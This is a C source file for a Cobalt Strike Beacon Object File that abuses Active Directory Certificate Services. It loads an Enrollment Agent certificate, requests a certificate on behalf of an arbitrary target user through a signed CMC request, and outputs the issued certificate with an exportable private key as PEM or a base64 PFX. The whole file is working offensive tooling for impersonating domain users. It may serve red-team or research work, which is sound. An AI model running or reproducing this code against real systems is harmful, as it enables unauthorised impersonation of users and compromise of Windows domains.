#include <windows.h>
#include <stdio.h>
#include <oleauto.h>
#include <wchar.h>
#include <stdlib.h>
#include <combaseapi.h>
#include "beacon.h"
#include "bofdefs.h"
#include "base.c"
#include "CertCli.h"
#include "CertPol.h"
#include "certenroll.h"

#define SAFE_RELEASE( interfacepointer )	\
	if ( (interfacepointer) != NULL )	\
	{	\
		(interfacepointer)->lpVtbl->Release(interfacepointer);	\
		(interfacepointer) = NULL;	\
	}
#define SAFE_SYS_FREE( string_ptr )	\
	if ( (string_ptr) != NULL )	\
	{	\
		OLEAUT32$SysFreeString(string_ptr);	\
		(string_ptr) = NULL;	\
	}
#define SAFE_INT_FREE( int_ptr ) \
	if (int_ptr) \
	{ \
		intFree(int_ptr); \
		int_ptr = NULL; \
	}

#define CHECK_RETURN_FAIL(function, result) \
	if (FAILED(result)) \
	{ \
		BeaconPrintf(CALLBACK_ERROR, "%s failed: 0x%08lx\n", function, result); \
		goto fail; \
	}

#define CHECK_RETURN_FALSE(function, result) \
	if (FALSE == (BOOL)result) \
	{ \
		result = KERNEL32$GetLastError(); \
		BeaconPrintf(CALLBACK_ERROR, "%s failed: %lu\n", function, (DWORD)result); \
		result = HRESULT_FROM_WIN32(result); \
		goto fail; \
	}

#define CHECK_RETURN_NULL(function, return_value, result) \
	if (NULL == return_value) \
	{ \
		result = E_INVALIDARG; \
		BeaconPrintf(CALLBACK_ERROR, "%s failed\n", function); \
		goto fail; \
	}

#define PRIVATE_KEY_LENGTH 2048

HCERTSTORE LoadEnrollmentAgentCert(LPBYTE pbCert, DWORD cbCert, LPCWSTR wszPassword, PCCERT_CONTEXT *ppCert)
{
	CRYPT_DATA_BLOB pfxData;
	HCERTSTORE hPfxStore = NULL;
	HCERTSTORE hCertStore = NULL;
	PCCERT_CONTEXT pCert = NULL;
	PCCERT_CONTEXT pStoreCert = NULL;

	// Validate input
	if (!pbCert || cbCert == 0 || !ppCert) {
		BeaconPrintf(CALLBACK_ERROR, "LoadEnrollmentAgentCert: invalid input (pbCert=%p, cbCert=%lu)\n", pbCert, cbCert);
		return NULL;
	}

	pfxData.cbData = cbCert;
	pfxData.pbData = pbCert;
	*ppCert = NULL;

	// Open the user's MY store
	hCertStore = CRYPT32$CertOpenStore(CERT_STORE_PROV_SYSTEM, 0, 0, CERT_SYSTEM_STORE_CURRENT_USER, L"MY");
	if (!hCertStore) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to open certificate store: %lu\n", KERNEL32$GetLastError());
		return NULL;
	}

	// Import PFX to temporary store
	hPfxStore = CRYPT32$PFXImportCertStore(&pfxData, wszPassword ? wszPassword : L"", CRYPT_USER_KEYSET);
	if (!hPfxStore) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to import PFX: %lu\n", KERNEL32$GetLastError());
		CRYPT32$CertCloseStore(hCertStore, 0);
		return NULL;
	}

	// Get the certificate from PFX store
	pCert = CRYPT32$CertEnumCertificatesInStore(hPfxStore, NULL);
	if (!pCert) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to enumerate certificates in PFX\n");
		CRYPT32$CertCloseStore(hPfxStore, 0);
		CRYPT32$CertCloseStore(hCertStore, 0);
		return NULL;
	}

	// Add to MY store temporarily (needed for signing)
	if (!CRYPT32$CertAddCertificateContextToStore(hCertStore, pCert, CERT_STORE_ADD_ALWAYS, &pStoreCert)) {
		BeaconPrintf(CALLBACK_ERROR, "Failed to add certificate to store: %lu\n", KERNEL32$GetLastError());
		CRYPT32$CertFreeCertificateContext(pCert);
		CRYPT32$CertCloseStore(hPfxStore, 0);
		CRYPT32$CertCloseStore(hCertStore, 0);
		return NULL;
	}

	// Clean up original cert from PFX store
	CRYPT32$CertDeleteCertificateFromStore(pCert);
	CRYPT32$CertCloseStore(hPfxStore, 0);

	*ppCert = pStoreCert;
	return hCertStore;
}

HRESULT RequestCertOnBehalf( LPCWSTR lpswzCA, LPCWSTR lpswzTemplate, LPCWSTR lpswzTargetUser, LPBYTE pbEnrollmentCert, DWORD cbEnrollmentCert, LPCWSTR lpswzEaCertPassword, LPCWSTR lpswzPfxPassword, BOOL bPem)
{
	HRESULT hr = S_OK;
	
	// COM interfaces
	IX509CertificateRequestCmc *pCmc = NULL;
	IX509Enrollment *pEnroll = NULL;
	IX509CertificateRequest *pRequest = NULL;
	IX509CertificateRequest *pInnerRequest = NULL;
	IX509CertificateRequestPkcs10 *pPkcs10 = NULL;
	IX509PrivateKey *pKey = NULL;
	ISignerCertificate *pSignerCertificate = NULL;
	ISignerCertificates *pSignerCertificates = NULL;
	IX509EnrollmentStatus *pStatus = NULL;
	
	// Strings
	BSTR bstrTemplateName = NULL;
	BSTR bstrRequesterName = NULL;
	BSTR bstrEaCert = NULL;
	BSTR bstrCertificate = NULL;
	BSTR bstrPassword = NULL;
	BSTR bstrErrorText = NULL;
	BSTR bstrStatusText = NULL;
	
	// Certificate store
	HCERTSTORE hCertStore = NULL;
	PCCERT_CONTEXT pEnrollCert = NULL;
	PCCERT_CONTEXT pResultCert = NULL;
	PCCERT_CONTEXT pFoundCert = NULL;
	
	// PEM export variables
	BSTR bstrExportType = NULL;
	BSTR bstrPrivateKey = NULL;
	DWORD dwPrivateKeyLen = 0;
	LPBYTE pPrivateDER = NULL;
	DWORD pemPrivateSize = 0;
	LPWSTR pPrivatePEM = NULL;
	
	// PFX export variables
	BSTR bstrContainerName = NULL;
	BSTR bstrProviderName = NULL;
	X509ProviderType providerType = 0;
	LPCWSTR wszPfxPassword = (lpswzPfxPassword && lpswzPfxPassword[0]) ? lpswzPfxPassword : L"";
	DWORD dwCertLen = 0;
	LPBYTE pbCertDER = NULL;
	PCCERT_CONTEXT pCertContext = NULL;
	PCCERT_CONTEXT pStoreCert = NULL;
	HCERTSTORE hMemStore = NULL;
	CRYPT_KEY_PROV_INFO keyProvInfo = {0};
	CRYPT_DATA_BLOB pfxBlob = {0};
	DWORD dwPfxB64Len = 0;
	LPSTR pszPfxB64 = NULL;
	
	EnrollmentEnrollStatus enrollStatus;

	// CLSIDs and IIDs
	CLSID CLSID_X509CertificateRequestCmc = {0x884e2045, 0x217d, 0x11da, {0xb2, 0xa4, 0x00, 0x0e, 0x7b, 0xbb, 0x2b, 0x09}};
	IID IID_IX509CertificateRequestCmc = {0x728ab345, 0x217d, 0x11da, {0xb2, 0xa4, 0x00, 0x0e, 0x7b, 0xbb, 0x2b, 0x09}};

	CLSID CLSID_SignerCertificate = {0x884e203d, 0x217d, 0x11da, {0xb2, 0xa4, 0x00, 0x0e, 0x7b, 0xbb, 0x2b, 0x09}};
	IID IID_ISignerCertificate = {0x728ab33d, 0x217d, 0x11da, {0xb2, 0xa4, 0x00, 0x0e, 0x7b, 0xbb, 0x2b, 0x09}};

	CLSID CLSID_CX509Enrollment = {0x884e2046, 0x217d, 0x11da, {0xb2, 0xa4, 0x00, 0x0e, 0x7b, 0xbb, 0x2b, 0x09}};
	IID IID_IX509Enrollment = {0x728ab346, 0x217d, 0x11da, {0xb2, 0xa4, 0x00, 0x0e, 0x7b, 0xbb, 0x2b, 0x09}};

	IID IID_IX509CertificateRequestPkcs10 = {0x728ab342, 0x217d, 0x11da, {0xb2, 0xa4, 0x00, 0x0e, 0x7b, 0xbb, 0x2b, 0x09}};

	internal_printf("[*] CA            : %S\n", lpswzCA ? lpswzCA : L"(null)");
	internal_printf("[*] Template      : %S\n", lpswzTemplate ? lpswzTemplate : L"(null)");
	internal_printf("[*] Target User   : %S\n", lpswzTargetUser ? lpswzTargetUser : L"(null)");
	internal_printf("[*] Cert size     : %lu\n", cbEnrollmentCert);

	// Initialize COM
	hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
	if (hr == RPC_E_CHANGED_MODE || hr == S_FALSE) {
		hr = S_OK;
	}
	CHECK_RETURN_FAIL("CoInitializeEx", hr);

	// Load Enrollment Agent certificate
	hCertStore = LoadEnrollmentAgentCert(pbEnrollmentCert, cbEnrollmentCert, lpswzEaCertPassword, &pEnrollCert);
	CHECK_RETURN_NULL("LoadEnrollmentAgentCert", hCertStore, hr);
	internal_printf("[+] Enrollment Agent certificate loaded\n");

	// Allocate strings
	bstrTemplateName = OLEAUT32$SysAllocString(lpswzTemplate);
	bstrRequesterName = OLEAUT32$SysAllocString(lpswzTargetUser);
	bstrPassword = OLEAUT32$SysAllocString(wszPfxPassword);

	// Create exportable private key first
	{
		CLSID CLSID_CX509PrivateKey = {0x884e200c, 0x217d, 0x11da, {0xb2, 0xa4, 0x00, 0x0e, 0x7b, 0xbb, 0x2b, 0x09}};
		IID IID_IX509PrivateKey = {0x728ab30c, 0x217d, 0x11da, {0xb2, 0xa4, 0x00, 0x0e, 0x7b, 0xbb, 0x2b, 0x09}};
		BSTR bstrProvName = NULL;
		
		hr = OLE32$CoCreateInstance(&CLSID_CX509PrivateKey, NULL, CLSCTX_INPROC_SERVER, &IID_IX509PrivateKey, (LPVOID*)&pKey);
		CHECK_RETURN_FAIL("CoCreateInstance(PrivateKey)", hr);
		
		// Force CAPI provider for PFX export compatibility
		bstrProvName = OLEAUT32$SysAllocString(MS_ENHANCED_PROV_W);
		hr = pKey->lpVtbl->put_ProviderName(pKey, bstrProvName);
		OLEAUT32$SysFreeString(bstrProvName);
		CHECK_RETURN_FAIL("put_ProviderName", hr);
		
		hr = pKey->lpVtbl->put_ProviderType(pKey, XCN_PROV_RSA_FULL);
		CHECK_RETURN_FAIL("put_ProviderType", hr);
		
		hr = pKey->lpVtbl->put_Length(pKey, PRIVATE_KEY_LENGTH);
		CHECK_RETURN_FAIL("put_Length", hr);
		
		hr = pKey->lpVtbl->put_KeySpec(pKey, XCN_AT_KEYEXCHANGE);
		CHECK_RETURN_FAIL("put_KeySpec", hr);
		
		hr = pKey->lpVtbl->put_MachineContext(pKey, VARIANT_FALSE);
		CHECK_RETURN_FAIL("put_MachineContext", hr);
		
		// Make key exportable
		hr = pKey->lpVtbl->put_ExportPolicy(pKey, XCN_NCRYPT_ALLOW_EXPORT_FLAG | XCN_NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG);
		CHECK_RETURN_FAIL("put_ExportPolicy", hr);
		
		hr = pKey->lpVtbl->Create(pKey);
		CHECK_RETURN_FAIL("PrivateKey->Create", hr);
		internal_printf("[+] Exportable private key created\n");
	}

	// Create inner PKCS10 request with our exportable key
	{
		CLSID CLSID_CX509CertificateRequestPkcs10 = {0x884e2042, 0x217d, 0x11da, {0xb2, 0xa4, 0x00, 0x0e, 0x7b, 0xbb, 0x2b, 0x09}};
		
		hr = OLE32$CoCreateInstance(&CLSID_CX509CertificateRequestPkcs10, NULL, CLSCTX_INPROC_SERVER, &IID_IX509CertificateRequestPkcs10, (LPVOID*)&pPkcs10);
		CHECK_RETURN_FAIL("CoCreateInstance(PKCS10)", hr);
		
		hr = pPkcs10->lpVtbl->InitializeFromPrivateKey(pPkcs10, ContextUser, pKey, bstrTemplateName);
		CHECK_RETURN_FAIL("InitializeFromPrivateKey", hr);
		internal_printf("[+] PKCS10 request initialized with exportable key\n");
	}

	// Create CMC request wrapping the PKCS10
	hr = OLE32$CoCreateInstance(&CLSID_X509CertificateRequestCmc, NULL, CLSCTX_INPROC_SERVER, &IID_IX509CertificateRequestCmc, (LPVOID*)&pCmc);
	CHECK_RETURN_FAIL("CoCreateInstance(CMC)", hr);

	hr = pCmc->lpVtbl->InitializeFromInnerRequest(pCmc, (IX509CertificateRequest*)pPkcs10);
	CHECK_RETURN_FAIL("InitializeFromInnerRequest", hr);
	internal_printf("[+] CMC request initialized for template: %S\n", lpswzTemplate);

	// Set requester name (the target user)
	hr = pCmc->lpVtbl->put_RequesterName(pCmc, bstrRequesterName);
	CHECK_RETURN_FAIL("put_RequesterName", hr);
	internal_printf("[+] Requester set to: %S\n", lpswzTargetUser);

	// Create signer certificate from EA cert
	bstrEaCert = OLEAUT32$SysAllocStringByteLen((CHAR const *)pEnrollCert->pbCertEncoded, pEnrollCert->cbCertEncoded);

	hr = OLE32$CoCreateInstance(&CLSID_SignerCertificate, NULL, CLSCTX_INPROC_SERVER, &IID_ISignerCertificate, (LPVOID*)&pSignerCertificate);
	CHECK_RETURN_FAIL("CoCreateInstance(SignerCertificate)", hr);

	hr = pSignerCertificate->lpVtbl->Initialize(pSignerCertificate, VARIANT_FALSE, VerifyNone, XCN_CRYPT_STRING_BINARY, bstrEaCert);
	CHECK_RETURN_FAIL("SignerCertificate->Initialize", hr);

	// Add signer to CMC request
	hr = pCmc->lpVtbl->get_SignerCertificates(pCmc, &pSignerCertificates);
	CHECK_RETURN_FAIL("get_SignerCertificates", hr);

	hr = pSignerCertificates->lpVtbl->Add(pSignerCertificates, pSignerCertificate);
	CHECK_RETURN_FAIL("SignerCertificates->Add", hr);
	internal_printf("[+] Request signed with Enrollment Agent certificate\n");

	// Create enrollment and submit
	hr = OLE32$CoCreateInstance(&CLSID_CX509Enrollment, NULL, CLSCTX_INPROC_SERVER, &IID_IX509Enrollment, (LPVOID*)&pEnroll);
	CHECK_RETURN_FAIL("CoCreateInstance(Enrollment)", hr);

	hr = pEnroll->lpVtbl->InitializeFromRequest(pEnroll, (IX509CertificateRequest *)pCmc);
	CHECK_RETURN_FAIL("InitializeFromRequest", hr);

	hr = pEnroll->lpVtbl->Enroll(pEnroll);
	CHECK_RETURN_FAIL("Enroll", hr);

	// Check enrollment status
	hr = pEnroll->lpVtbl->get_Status(pEnroll, &pStatus);
	CHECK_RETURN_FAIL("get_Status", hr);

	hr = pStatus->lpVtbl->get_Status(pStatus, &enrollStatus);
	CHECK_RETURN_FAIL("get_Status(status)", hr);

	pStatus->lpVtbl->get_ErrorText(pStatus, &bstrErrorText);
	pStatus->lpVtbl->get_Text(pStatus, &bstrStatusText);

	if (enrollStatus != Enrolled) {
		if (enrollStatus == EnrollPended) {
			internal_printf("[!] Request pending\n");
		} else {
			internal_printf("[!] Request failed\n");
		}
		if (bstrErrorText) internal_printf("    Error: %S\n", bstrErrorText);
		if (bstrStatusText) internal_printf("    Status: %S\n", bstrStatusText);
		hr = E_FAIL;
		goto fail;
	}

	internal_printf("[+] Certificate issued!\n");

	// Get the certificate
	hr = pEnroll->lpVtbl->get_Certificate(pEnroll, XCN_CRYPT_STRING_BASE64, &bstrCertificate);
	CHECK_RETURN_FAIL("get_Certificate", hr);

	// Get container name for export
	hr = pKey->lpVtbl->get_UniqueContainerName(pKey, &bstrContainerName);
	CHECK_RETURN_FAIL("get_UniqueContainerName", hr);

	if (bPem) {
		// PEM output format
		bstrExportType = OLEAUT32$SysAllocString(BCRYPT_PRIVATE_KEY_BLOB);
		hr = pKey->lpVtbl->Export(pKey, bstrExportType, XCN_CRYPT_STRING_BINARY, &bstrPrivateKey);
		CHECK_RETURN_FAIL("pKey->Export()", hr);
		
		// Convert from BCRYPT_PRIVATE_KEY_BLOB to DER
		CRYPT32$CryptEncodeObjectEx(X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, PKCS_RSA_PRIVATE_KEY, (LPCVOID)bstrPrivateKey, 0, NULL, NULL, &dwPrivateKeyLen);
		pPrivateDER = (LPBYTE)intAlloc(dwPrivateKeyLen);
		CHECK_RETURN_NULL("intAlloc for private DER", pPrivateDER, hr);
		hr = CRYPT32$CryptEncodeObjectEx(X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, PKCS_RSA_PRIVATE_KEY, (LPCVOID)bstrPrivateKey, 0, NULL, (LPVOID)pPrivateDER, &dwPrivateKeyLen);
		CHECK_RETURN_FALSE("CryptEncodeObjectEx", hr);

		// Convert from DER to PEM format
		CRYPT32$CryptBinaryToStringW(pPrivateDER, dwPrivateKeyLen, CRYPT_STRING_BASE64, NULL, &pemPrivateSize);
		pPrivatePEM = (LPWSTR)intAlloc(pemPrivateSize * sizeof(WCHAR));
		CHECK_RETURN_NULL("intAlloc for private PEM", pPrivatePEM, hr);
		hr = CRYPT32$CryptBinaryToStringW(pPrivateDER, dwPrivateKeyLen, CRYPT_STRING_BASE64, pPrivatePEM, &pemPrivateSize);
		CHECK_RETURN_FALSE("CryptBinaryToStringW", hr);

		// Display the certificate in PEM format
		internal_printf("[*] cert.pem:\n");
		internal_printf("-----BEGIN RSA PRIVATE KEY-----\n");
		internal_printf("%S", pPrivatePEM);
		internal_printf("-----END RSA PRIVATE KEY-----\n");
		internal_printf("-----BEGIN CERTIFICATE-----\n");
		internal_printf("%S", bstrCertificate);
		internal_printf("-----END CERTIFICATE-----\n");
		internal_printf("[*] Convert with:\nopenssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out cert.pfx\n");
	} else {
		// PFX output format
		CRYPT32$CryptStringToBinaryW(bstrCertificate, 0, CRYPT_STRING_BASE64, NULL, &dwCertLen, NULL, NULL);
		pbCertDER = (LPBYTE)intAlloc(dwCertLen);
		CHECK_RETURN_NULL("intAlloc for cert DER", pbCertDER, hr);
		hr = CRYPT32$CryptStringToBinaryW(bstrCertificate, 0, CRYPT_STRING_BASE64, pbCertDER, &dwCertLen, NULL, NULL);
		CHECK_RETURN_FALSE("CryptStringToBinaryW", hr);

		pCertContext = CRYPT32$CertCreateCertificateContext(X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, pbCertDER, dwCertLen);
		CHECK_RETURN_NULL("CertCreateCertificateContext", pCertContext, hr);

		hMemStore = CRYPT32$CertOpenStore(CERT_STORE_PROV_MEMORY, 0, 0, CERT_STORE_CREATE_NEW_FLAG, NULL);
		CHECK_RETURN_NULL("CertOpenStore", hMemStore, hr);

		hr = CRYPT32$CertAddCertificateContextToStore(hMemStore, pCertContext, CERT_STORE_ADD_ALWAYS, &pStoreCert);
		CHECK_RETURN_FALSE("CertAddCertificateContextToStore", hr);

		keyProvInfo.pwszContainerName = bstrContainerName;
		keyProvInfo.pwszProvName = MS_ENHANCED_PROV_W;
		keyProvInfo.dwProvType = PROV_RSA_FULL;
		keyProvInfo.dwFlags = 0;
		keyProvInfo.dwKeySpec = AT_KEYEXCHANGE;

		hr = CRYPT32$CertSetCertificateContextProperty(pStoreCert, CERT_KEY_PROV_INFO_PROP_ID, 0, &keyProvInfo);
		CHECK_RETURN_FALSE("CertSetCertificateContextProperty", hr);

		CRYPT32$PFXExportCertStoreEx(hMemStore, &pfxBlob, wszPfxPassword, NULL, EXPORT_PRIVATE_KEYS);
		if (pfxBlob.cbData > 0) {
			pfxBlob.pbData = (BYTE*)intAlloc(pfxBlob.cbData);
			CHECK_RETURN_NULL("intAlloc for PFX", pfxBlob.pbData, hr);

			hr = CRYPT32$PFXExportCertStoreEx(hMemStore, &pfxBlob, wszPfxPassword, NULL, EXPORT_PRIVATE_KEYS);
			CHECK_RETURN_FALSE("PFXExportCertStoreEx", hr);

			CRYPT32$CryptBinaryToStringA(pfxBlob.pbData, pfxBlob.cbData, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &dwPfxB64Len);
			pszPfxB64 = (LPSTR)intAlloc(dwPfxB64Len + 1);
			CHECK_RETURN_NULL("intAlloc for PFX B64", pszPfxB64, hr);
			CRYPT32$CryptBinaryToStringA(pfxBlob.pbData, pfxBlob.cbData, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, pszPfxB64, &dwPfxB64Len);

			internal_printf("[*] cert.pfx (password: '%S'):\n\n%s\n\n", wszPfxPassword, pszPfxB64);
		}
	}

	// Cleanup: Delete private key and certificate from store
	if (pKey) {
		pKey->lpVtbl->Close(pKey);
		pKey->lpVtbl->Delete(pKey);
		internal_printf("[+] Private key deleted from local store\n");
	}

	hr = S_OK;

fail:
	// PEM cleanup
	SAFE_INT_FREE(pPrivateDER);
	SAFE_INT_FREE(pPrivatePEM);
	SAFE_SYS_FREE(bstrPrivateKey);
	SAFE_SYS_FREE(bstrExportType);
	// PFX cleanup
	SAFE_INT_FREE(pszPfxB64);
	if (pfxBlob.pbData) intFree(pfxBlob.pbData);
	if (pStoreCert) CRYPT32$CertFreeCertificateContext(pStoreCert);
	if (pCertContext) CRYPT32$CertFreeCertificateContext(pCertContext);
	if (hMemStore) CRYPT32$CertCloseStore(hMemStore, 0);
	SAFE_INT_FREE(pbCertDER);
	// COM cleanup
	SAFE_RELEASE(pKey);
	SAFE_RELEASE(pPkcs10);
	SAFE_RELEASE(pInnerRequest);
	SAFE_RELEASE(pRequest);
	SAFE_RELEASE(pStatus);
	SAFE_RELEASE(pEnroll);
	SAFE_RELEASE(pSignerCertificates);
	SAFE_RELEASE(pSignerCertificate);
	SAFE_RELEASE(pCmc);
	// String cleanup
	SAFE_SYS_FREE(bstrContainerName);
	SAFE_SYS_FREE(bstrProviderName);
	SAFE_SYS_FREE(bstrStatusText);
	SAFE_SYS_FREE(bstrErrorText);
	SAFE_SYS_FREE(bstrCertificate);
	SAFE_SYS_FREE(bstrEaCert);
	SAFE_SYS_FREE(bstrPassword);
	SAFE_SYS_FREE(bstrRequesterName);
	SAFE_SYS_FREE(bstrTemplateName);
	// Certificate cleanup - delete EA cert from MY store
	if (pEnrollCert) {
		CRYPT32$CertDeleteCertificateFromStore(pEnrollCert);
		pEnrollCert = NULL; // CertDeleteCertificateFromStore frees the context
	}
	if (hCertStore) CRYPT32$CertCloseStore(hCertStore, 0);

	OLE32$CoUninitialize();

	return hr;
}

#ifdef BOF
VOID go( IN PCHAR Buffer, IN ULONG Length )
{
	HRESULT hr = S_OK;
	datap parser;
	LPCWSTR lpswzCA = NULL;
	LPCWSTR lpswzTemplate = NULL;
	LPCWSTR lpswzTargetUser = NULL;
	LPCWSTR lpswzEaCertPassword = NULL;
	LPCWSTR lpswzPfxPassword = NULL;
	LPBYTE pbEnrollmentCert = NULL;
	int cbEnrollmentCert = 0;
	BOOL bPem = FALSE;

	if (!bofstart())
		return;

	BeaconDataParse(&parser, Buffer, Length);
	lpswzCA = (LPCWSTR)BeaconDataExtract(&parser, NULL);
	lpswzTemplate = (LPCWSTR)BeaconDataExtract(&parser, NULL);
	lpswzTargetUser = (LPCWSTR)BeaconDataExtract(&parser, NULL);
	lpswzEaCertPassword = (LPCWSTR)BeaconDataExtract(&parser, NULL);
	lpswzPfxPassword = (LPCWSTR)BeaconDataExtract(&parser, NULL);
	pbEnrollmentCert = (LPBYTE)BeaconDataExtract(&parser, &cbEnrollmentCert);
	bPem = (BOOL)BeaconDataShort(&parser);

	internal_printf("\n=== ADCS Request On Behalf ===\n");

	hr = RequestCertOnBehalf( lpswzCA, lpswzTemplate, lpswzTargetUser, pbEnrollmentCert, cbEnrollmentCert, lpswzEaCertPassword, lpswzPfxPassword, bPem );
	if (S_OK != hr) {
		BeaconPrintf(CALLBACK_ERROR, "RequestCertOnBehalf failed: 0x%08lx\n", hr);
		goto fail;
	}

	internal_printf("\n--- SUCCESS ---\n");

fail:
	printoutput(TRUE);
	bofstop();
};
#else
int main(int argc, char **argv)
{
	internal_printf("Test mode not implemented\n");
	return 0;
}
#endif
